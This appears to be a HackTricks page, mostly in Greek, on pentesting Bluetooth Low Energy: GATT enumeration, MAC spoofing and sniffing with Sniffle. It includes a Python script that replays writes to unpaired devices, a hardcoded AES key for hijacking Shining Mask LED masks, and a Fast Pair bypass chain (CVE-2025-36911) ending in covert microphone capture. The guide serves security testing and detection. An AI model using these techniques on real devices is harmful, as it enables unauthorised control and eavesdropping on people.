# Pentesting BLE - Bluetooth Low Energy

{{#include ../../banners/hacktricks-training.md}}

## Εισαγωγή

Διαθέσιμο από το πρότυπο Bluetooth 4.0, το BLE χρησιμοποιεί μόνο 40 κανάλια, καλύπτοντας το εύρος 2400 έως 2483.5 MHz. Σε αντίθεση, το παραδοσιακό Bluetooth χρησιμοποιεί 79 κανάλια στο ίδιο εύρος.

Οι συσκευές BLE επικοινωνούν στέλνοντας **πακέτα διαφήμισης** (**beacons**), τα πακέτα αυτά μεταδίδουν την ύπαρξη της συσκευής BLE σε άλλες κοντινές συσκευές. Αυτά τα beacons μερικές φορές επίσης **στέλνουν δεδομένα**.

Η συσκευή που ακούει, που επίσης ονομάζεται κεντρική συσκευή, μπορεί να απαντήσει σε ένα advertising packet με ένα **SCAN request** που αποστέλλεται συγκεκριμένα στη διαφημιζόμενη συσκευή. Η **απάντηση** σε αυτό το scan χρησιμοποιεί την ίδια δομή με το **advertising** packet με επιπρόσθετες πληροφορίες που δεν χωρούσαν στο αρχικό advertising request, όπως το πλήρες όνομα της συσκευής.

![](<../../images/image (152).png>)

Το preamble byte συγχρονίζει τη συχνότητα, ενώ η τετρα-μπάιτ access address είναι ένας **αναγνωριστής σύνδεσης** (connection identifier), που χρησιμοποιείται σε σενάρια όπου πολλές συσκευές προσπαθούν να δημιουργήσουν συνδέσεις στα ίδια κανάλια. Στη συνέχεια, η Protocol Data Unit (**PDU**) περιέχει τα **δεδομένα διαφήμισης**. Υπάρχουν διάφοροι τύποι PDU· οι πιο συχνά χρησιμοποιούμενοι είναι οι ADV_NONCONN_IND και ADV_IND. Οι συσκευές χρησιμοποιούν τον τύπο PDU **ADV_NONCONN_IND** αν **δεν αποδέχονται συνδέσεις**, μεταδίδοντας δεδομένα μόνο στο advertising packet. Οι συσκευές χρησιμοποιούν **ADV_IND** αν **επιτρέπουν συνδέσεις** και **διακόπτουν την αποστολή advertising** πακέτων μόλις μια **σύνδεση** έχει **εγκατασταθεί**.

### GATT

Το **Προφίλ Γενικών Χαρακτηριστικών** (GATT) ορίζει πώς η **συσκευή πρέπει να μορφοποιεί και να μεταφέρει δεδομένα**. Όταν αναλύετε την επιφάνεια επίθεσης μιας συσκευής BLE, συχνά εστιάζετε στο GATT (ή τα GATT), γιατί αυτός είναι ο τρόπος με τον οποίο ενεργοποιείται η λειτουργικότητα της συσκευής και πώς τα δεδομένα αποθηκεύονται, ομαδοποιούνται και τροποποιούνται. Το GATT απαριθμεί τα χαρακτηριστικά, τους descriptors και τις υπηρεσίες μιας συσκευής σε έναν πίνακα ως τιμές 16- ή 32-μπιτών. Μια **χαρακτηριστική** είναι μια **τιμή δεδομένων** που **αποστέλλεται** μεταξύ της κεντρικής συσκευής και του περιφερειακού. Αυτές οι χαρακτηριστικές μπορούν να έχουν **descriptors** που **παρέχουν επιπλέον πληροφορίες γι' αυτές**. Οι **χαρακτηριστικές** συχνά **ομαδοποιούνται** σε **services** αν σχετίζονται με την εκτέλεση μιας συγκεκριμένης ενέργειας.

## Εντοπισμός
```bash
hciconfig #Check config, check if UP or DOWN
# If DOWN try:
sudo modprobe -c bluetooth
sudo hciconfig hci0 down && sudo hciconfig hci0 up

# Spoof MAC
spooftooph -i hci0 -a 11:22:33:44:55:66
```
### GATTool

**GATTool** σας επιτρέπει να **εγκαθιδρύσετε** μια **σύνδεση** με άλλη συσκευή, να απαριθμήσετε τα **χαρακτηριστικά** της συσκευής και να διαβάσετε και να γράψετε τις ιδιότητές της.\
GATTTool μπορεί να ξεκινήσει ένα interactive shell με την επιλογή `-I`:

<details>
<summary>Διαδραστική χρήση και παραδείγματα του GATTTool</summary>
```bash
gatttool -i hci0 -I
[ ][LE]> connect 24:62:AB:B1:A8:3E Attempting to connect to A4:CF:12:6C:B3:76 Connection successful
[A4:CF:12:6C:B3:76][LE]> characteristics
handle: 0x0002, char properties: 0x20, char value handle:
0x0003, uuid: 00002a05-0000-1000-8000-00805f9b34fb
handle: 0x0015, char properties: 0x02, char value handle:
0x0016, uuid: 00002a00-0000-1000-8000-00805f9b34fb
[...]

# Write data
gatttool -i <Bluetooth adapter interface> -b <MAC address of device> --char-write-req <characteristic handle> -n <value>
gatttool -b a4:cf:12:6c:b3:76 --char-write-req -a 0x002e -n $(echo -n "04dc54d9053b4307680a"|xxd -ps)

# Read data
gatttool -i <Bluetooth adapter interface> -b <MAC address of device> --char-read -a 0x16

# Read connecting with an authenticated encrypted connection
gatttool --sec-level=high -b a4:cf:12:6c:b3:76 --char-read -a 0x002c
```
</details>

### Bettercap
```bash
# Start listening for beacons
sudo bettercap --eval "ble.recon on"
# Wait some time
>> ble.show # Show discovered devices
>> ble.enum <mac addr> # This will show the service, characteristics and properties supported

# Write data in a characteristic
>> ble.write <MAC ADDR> <UUID> <HEX DATA>
>> ble.write <mac address of device> ff06 68656c6c6f # Write "hello" in ff06
```
## Sniffing και ενεργός έλεγχος μη-ζευγαρωμένων BLE συσκευών

Πολλά χαμηλού κόστους BLE περιφερειακά δεν επιβάλλουν pairing/bonding. Χωρίς bonding, η Link Layer κρυπτογράφηση δεν ενεργοποιείται ποτέ, οπότε η ATT/GATT κίνηση είναι σε cleartext. Ένας off-path sniffer μπορεί να ακολουθήσει τη σύνδεση, να αποκωδικοποιήσει τις λειτουργίες GATT για να μάθει τα characteristic handles και values, και οποιοσδήποτε κοντινός host μπορεί στη συνέχεια να συνδεθεί και να replay αυτά τα writes για να ελέγξει τη συσκευή.

### Sniffing with Sniffle (CC26x2/CC1352)

Υλικό: ένα Sonoff Zigbee 3.0 USB Dongle Plus (CC26x2/CC1352) επαναπρογραμματισμένο με το Sniffle firmware της NCC Group.

Εγκαταστήστε το Sniffle και το Wireshark extcap σε Linux:

<details>
<summary>Εγκατάσταση Sniffle extcap (Linux)</summary>
```bash
if [ ! -d /opt/sniffle/Sniffle-1.10.0/python_cli ]; then
echo "[+] - Sniffle not installed! Installing at 1.10.0..."
sudo mkdir -p /opt/sniffle
sudo chown -R $USER:$USER /opt/sniffle
pushd /opt/sniffle
wget https://github.com/nccgroup/Sniffle/archive/refs/tags/v1.10.0.tar.gz
tar xvf v1.10.0.tar.gz
# Install Wireshark extcap for user and root only
mkdir -p $HOME/.local/lib/wireshark/extcap
ln -s /opt/sniffle/Sniffle-1.10.0/python_cli/sniffle_extcap.py $HOME/.local/lib/wireshark/extcap
sudo mkdir -p /root/.local/lib/wireshark/extcap
sudo ln -s /opt/sniffle/Sniffle-1.10.0/python_cli/sniffle_extcap.py /root/.local/lib/wireshark/extcap
popd
else
echo "[+] - Sniffle already installed at 1.10.0"
fi
```
</details>

Flash Sonoff with Sniffle firmware (βεβαιωθείτε ότι η σειριακή συσκευή σας ταιριάζει, π.χ. /dev/ttyUSB0):
```bash
pushd /opt/sniffle/
wget https://github.com/nccgroup/Sniffle/releases/download/v1.10.0/sniffle_cc1352p1_cc2652p1_1M.hex
git clone https://github.com/sultanqasim/cc2538-bsl.git
cd cc2538-bsl
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install pyserial intelhex
python3 cc2538-bsl.py -p /dev/ttyUSB0 --bootloader-sonoff-usb -ewv ../sniffle_cc1352p1_cc2652p1_1M.hex
deactivate
popd
```
Καταγράψτε στο Wireshark μέσω του Sniffle extcap και μεταβείτε γρήγορα στις εγγραφές που αλλάζουν κατάσταση φιλτράροντας:
```text
_ws.col.info contains "Sent Write Command"
```
Αυτό επισημαίνει ATT Write Commands από τον client· το handle και το value συχνά αντιστοιχούν απευθείας σε ενέργειες της συσκευής (π.χ., write 0x01 σε buzzer/alert characteristic, 0x00 για να σταματήσει).

Γρήγορα παραδείγματα για το Sniffle CLI:
```bash
python3 scanner.py --output scan.pcap
# Only devices with very strong signal
python3 scanner.py --rssi -40
# Filter advertisements containing a string
python3 sniffer.py --string "banana" --output sniff.pcap
```
Alternative sniffer: Nordic’s nRF Sniffer for BLE + Wireshark plugin also works. Σε μικρά/φθηνά Nordic dongles συνήθως αντικαθιστάτε το USB bootloader για να φορτώσετε το sniffer firmware, οπότε είτε κρατάτε ένα αφιερωμένο sniffer dongle είτε χρειάζεστε J-Link/JTAG για να επαναφέρετε τον bootloader αργότερα.

### Ενεργός έλεγχος μέσω GATT

Μόλις εντοπίσετε ένα writable characteristic handle και την τιμή από την sniffed traffic, συνδεθείτε ως οποιοδήποτε central και εκτελέστε την ίδια write:

- Με Nordic nRF Connect for Desktop (BLE app):
- Επιλέξτε το nRF52/nRF52840 dongle, σκανάρετε και συνδεθείτε στον στόχο.
- Περιηγηθείτε στη GATT database, εντοπίστε την target characteristic (συχνά έχει ένα φιλικό όνομα, π.χ., Alert Level).
- Εκτελέστε ένα Write με τα sniffed bytes (π.χ., 01 για trigger, 00 για stop).

- Αυτοματοποιήστε σε Windows με ένα Nordic dongle χρησιμοποιώντας Python + blatann:

<details>
<summary>Παράδειγμα Python blatann write (Windows + Nordic dongle)</summary>
```python
import time
import blatann

# CONFIG
COM_PORT = "COM29"  # Replace with your COM port
TARGET_MAC = "5B:B1:7F:47:A7:00"  # Replace with your target MAC

target_address = blatann.peer.PeerAddress.from_string(TARGET_MAC + ",p")

# CONNECT
ble_device = blatann.BleDevice(COM_PORT)
ble_device.configure()
ble_device.open()
print(f"[-] Connecting to {TARGET_MAC}...")
peer = ble_device.connect(target_address).wait()
if not peer:
print("[!] Connection failed.")
ble_device.close()
raise SystemExit(1)

print("Connected. Discovering services...")
peer.discover_services().wait(5, exception_on_timeout=False)

# Example: write 0x01/0x00 to a known handle
for service in peer.database.services:
for ch in service.characteristics:
if ch.handle == 0x000b:  # Replace with your handle
print("[!] Beeping.")
ch.write(b"\x01")
time.sleep(2)
print("[+] And relax.")
ch.write(b"\x00")

print("[-] Disconnecting...")
peer.disconnect()
peer.wait_for_disconnect()
ble_device.close()
```
</details>

### Μελέτη περίπτωσης: hijacking BLE LED masks (Shining Mask family)

Φθηνές, white‑labeled μάσκες LED με BLE, ελεγχόμενες από την εφαρμογή “Shining Mask”, δέχονται έλεγχο εγγραφής από οποιονδήποτε κοντινό central χωρίς pairing/bonding. Η εφαρμογή μιλάει GATT σε ένα command characteristic και σε ένα data characteristic· οι εντολές είναι AES‑ECB κρυπτογραφημένες με στατικό κλειδί ενσωματωμένο στην εφαρμογή, ενώ τα bulk δεδομένα εικόνας είναι μη κρυπτογραφημένα.

Key UUIDs on these devices:
- Χαρακτηριστικό εγγραφής εντολών: d44bc439-abfd-45a2-b575-925416129600
- Χαρακτηριστικό notify: d44bc439-abfd-45a2-b575-925416129601
- Χαρακτηριστικό δεδομένων εικόνας: d44bc439-abfd-45a2-b575-92541612960a

Μη αυθεντικοποιημένες GATT εγγραφές
- Δεν απαιτείται pairing/bonding. Οποιοσδήποτε host μπορεί να συνδεθεί και να γράψει στο command UUID για να αλλάξει τη φωτεινότητα, να επιλέξει εικόνες, να ξεκινήσει animations, κ.λπ.
- Common ops observed: LIGHT (brightness), IMAG (select index), DELE (delete indices), SPEED, ANIM, PLAY, CHEC (query count), DATS (begin upload).

Πλαίσιο εντολών με στατικό κλειδί AES
- Frame = 1‑byte length, ASCII op (e.g., b"LIGHT"), args, pad to 16, AES‑ECB encrypt with static key from the app.
- Known static key (hex): 32672f7974ad43451d9c6c894a0e8764

Python helper to encrypt and send a command (example: set max brightness):
```python
from Crypto.Cipher import AES
from binascii import unhexlify

KEY = unhexlify('32672f7974ad43451d9c6c894a0e8764')

def enc_cmd(op, args=b''):
body = bytes([len(op) + len(args)]) + op.encode() + args
body += b'\x00' * ((16 - (len(body) % 16)) % 16)
return AES.new(KEY, AES.MODE_ECB).encrypt(body)

packet = enc_cmd('LIGHT', b'\xff')
# Write 'packet' to d44bc439-abfd-45a2-b575-925416129600
```
Ροή μεταφόρτωσης εικόνας
- Μετά από ένα κρυπτογραφημένο DATS handshake, raw chunks γράφονται μη κρυπτογραφημένα στο data characteristic …960a.
- Packet format: [len][seq][payload]. Εμπειρικά ~100 bytes payload ανά packet λειτουργεί αξιόπιστα.

<details>
<summary>Ελάχιστος ψευδοκώδικας μεταφόρτωσης εικόνας</summary>
```python
# Start upload (encrypted): two bytes size, two bytes index, one toggle byte
img_index = b'\x01\x00'  # index 1
img_size  = (len(img_bytes)).to_bytes(2, 'big')
start     = enc_cmd('DATS', img_size + img_index + b'\x01')
write_cmd_char(start)  # expect DATSOK on notify char

# Stream raw chunks (unencrypted) to ...960a: [len][seq][payload]
seq = 0
CHUNK = 98  # data bytes per packet (≈100 total incl. len+seq)
for off in range(0, len(img_bytes), CHUNK):
chunk = img_bytes[off:off+CHUNK]
pkt = bytes([len(chunk)+1, seq & 0xff]) + chunk
write_data_char(pkt)
seq += 1

# Optionally signal completion if firmware expects it (e.g., DATCP)
```
</details>

### Fast Pair (0xFE2C) Key-Based Pairing signature bypass (WhisperPair/CVE-2025-36911)

- **Discovery:** Σάρωσε τα BLE advertisements για **service UUID 0xFE2C** (Google Fast Pair). Οι συσκευές σε pairing mode συνήθως εμφανίζουν ένα pairing badge· ακόμη και εκτός pairing mode η υπηρεσία Fast Pair μπορεί να απαντήσει σε GATT.
- **Non-invasive probe (signature enforcement check):**
1. GATT **connect** στην υπηρεσία Fast Pair και **read the Model ID**.
2. **Write a Key-Based Pairing (KBP) value without a signature**. Αν το peripheral αποδεχτεί το unsigned KBP write, είναι ευάλωτο στο signature-bypass (WhisperPair/CVE-2025-36911). Η απόρριψη υποδεικνύει patch· αποτυχίες μπορεί να είναι μη τελεσίδικες αν είναι ήδη paired.
- **BLE → BR/EDR pivot:** Στείλε ένα **KBP Request** και ανάλυσε την **encrypted response** για να ανακτήσεις τη **διεύθυνση BR/EDR** του στόχου. Χρησιμοποίησε μια classic bonding κλήση (π.χ. Android **`createBond(<BR/EDR address>)`**) για να ολοκληρώσεις μη εξουσιοδοτημένο pairing. Όπου υποστηρίζεται, η εγγραφή ενός **Account Key** διατηρεί τη σύνδεση.
- **Post-bond microphone abuse:** Μετά το bonding, άνοιξε **HFP** και ξεκίνα **SCO audio** για να αποκτήσεις live stream μικροφώνου για ακρόαση/ηχογράφηση (π.χ. αποθήκευση M4A). Αυτή η αλυσίδα μετατρέπει την αποδοχή unsigned KBP σε απομακρυσμένη καταγραφή ήχου χωρίς συναίνεση χρήστη.
- **Hunt/detect:** Ψάξε για Fast Pair GATT traffic που ακολουθείται αμέσως από classic **bonding attempts to the BR/EDR address returned in KBP**, και για KBP writes χωρίς signature. Η επιβολή signature validation στο KBP και η απαίτηση user-confirmed pairing σπάει την αλυσίδα.

## Operational notes

- Προτίμησε Sonoff+Sniffle σε Linux για αξιόπιστο channel hopping και connection following. Κράτα ένα επιπλέον Nordic sniffer ως backup.
- Χωρίς pairing/bonding, οποιοσδήποτε κοντινός attacker μπορεί να παρατηρήσει writes και να επαναπαίξει/συνθέσει δικά του σε unauthenticated writable characteristics.

## References

- [WPair — CVE-2025-36911 (WhisperPair) vulnerability scanner & research tool](https://github.com/zalexdev/wpair-app)
- [Start hacking Bluetooth Low Energy today! (part 2) – Pentest Partners](https://www.pentestpartners.com/security-blog/start-hacking-bluetooth-low-energy-today-part-2/)
- [Sniffle – A sniffer for Bluetooth 5 and 4.x LE](https://github.com/nccgroup/Sniffle)
- [Firmware installation for Sonoff USB Dongle (Sniffle README)](https://github.com/nccgroup/Sniffle?tab=readme-ov-file#firmware-installation-sonoff-usb-dongle)
- [Sonoff Zigbee 3.0 USB Dongle Plus (ZBDongle-P)](https://sonoff.tech/en-uk/products/sonoff-zigbee-3-0-usb-dongle-plus-zbdongle-p)
- [Nordic nRF Sniffer for Bluetooth LE](https://www.nordicsemi.com/Products/Development-tools/nRF-Sniffer-for-Bluetooth-LE)
- [nRF Connect for Desktop](https://www.nordicsemi.com/Products/Development-tools/nRF-Connect-for-desktop)
- [blatann – Python BLE library for Nordic devices](https://blatann.readthedocs.io/en/latest/)
- [Invasion of the Face Changers: Halloween Hijinks with Bluetooth LED Masks (Bishop Fox)](https://bishopfox.com/blog/invasion-of-the-face-changers-halloween-hijinks-with-bluetooth-led-masks)
- [Shining Mask BLE protocol notes (BrickCraftDream)](https://github.com/BrickCraftDream/Shining-Mask-stuff/blob/main/ble-protocol.md)
- [Android Bluetooth HCI snoop logging](https://source.android.com/docs/core/connect/bluetooth/verifying_debugging)
- [Adafruit Feather nRF52840 Express](https://www.adafruit.com/product/4062)

{{#include ../../banners/hacktricks-training.md}}
